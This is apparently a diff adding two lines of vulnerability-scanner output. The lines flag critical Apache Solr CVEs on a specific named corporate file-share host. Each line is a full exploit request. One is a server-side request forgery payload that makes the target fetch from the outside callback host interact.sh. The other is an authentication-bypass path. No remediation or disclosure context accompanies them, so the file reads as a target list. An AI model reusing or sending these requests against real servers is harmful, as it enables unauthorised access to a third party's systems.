@@ -1,0 +1,2 @@
+[CVE-2021-27905] [http] [critical] https://fileshare-eu.services.xerox.com/solr/prod-2/replication/?command=fetchindex&masterUrl=https://interact.sh
+[CVE-2024-45216] [http] [critical] https://fileshare-eu.services.xerox.com/solr/admin/info/properties:/admin/info/key
